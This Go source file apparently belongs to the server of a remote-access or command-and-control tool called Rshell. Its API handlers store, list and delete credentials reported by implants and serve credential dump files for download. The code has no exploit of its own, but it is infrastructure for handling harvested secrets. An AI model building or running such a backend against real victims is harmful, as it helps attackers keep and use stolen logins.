package api

import (
	"Rshell/pkg/database"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
)

func ListCredentials(c *gin.Context) {
	var creds []database.Credentials
	database.Engine.Desc("created_at").Find(&creds)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": creds})
}

type AddCredentialReq struct {
	Uid      string `json:"uid"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Secret   string `json:"secret"`
	CredType string `json:"cred_type"`
	Source   string `json:"source"`
	Notes    string `json:"notes"`
}

func AddCredential(c *gin.Context) {
	var req AddCredentialReq
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "error": err.Error()})
		return
	}

	cred := database.Credentials{
		Uid:       req.Uid,
		Target:    req.Target,
		Username:  req.Username,
		Secret:    req.Secret,
		CredType:  req.CredType,
		Source:    req.Source,
		Notes:     req.Notes,
		CreatedAt: time.Now().Unix(),
	}
	_, err := database.Engine.Insert(&cred)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": cred, "msg": "credential saved"})
}

func DeleteCredential(c *gin.Context) {
	id := c.Query("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "error": "id required"})
		return
	}

	_, err := database.Engine.Where("id = ?", id).Delete(&database.Credentials{})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "msg": "deleted"})
}

func AddCredentialFromImplant(uid, target, username, secret, credType, source string) {
	cred := database.Credentials{
		Uid:       uid,
		Target:    target,
		Username:  username,
		Secret:    secret,
		CredType:  credType,
		Source:    source,
		CreatedAt: time.Now().Unix(),
	}
	database.Engine.Insert(&cred)
	logger := fmt.Sprintf("[credential] %s: %s/%s (%s)", uid, target, username, credType)
	fmt.Println(logger)
}

type DumpInfo struct {
	Id        int64  `json:"id"`
	Uid       string `json:"uid"`
	FileName  string `json:"fileName"`
	FileSize  int64  `json:"fileSize"`
	CreatedAt int64  `json:"createdAt"`
}

func ListCredentialDumps(c *gin.Context) {
	uid := c.Query("uid")
	var dumps []database.CredentialDumps
	if uid != "" {
		database.Engine.Where("uid = ?", uid).Desc("id").Find(&dumps)
	} else {
		database.Engine.Desc("id").Find(&dumps)
	}
	var result []DumpInfo
	for _, d := range dumps {
		result = append(result, DumpInfo{
			Id:        d.Id,
			Uid:       d.Uid,
			FileName:  d.FileName,
			FileSize:  d.FileSize,
			CreatedAt: d.CreatedAt,
		})
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})
}

func DownloadCredentialDump(c *gin.Context) {
	id := c.Query("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id required"})
		return
	}
	var dump database.CredentialDumps
	exists, err := database.Engine.Where("id = ?", id).Get(&dump)
	if err != nil || !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Dump not found"})
		return
	}
	if _, err := os.Stat(dump.FilePath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", dump.FileName))
	c.File(dump.FilePath)
}
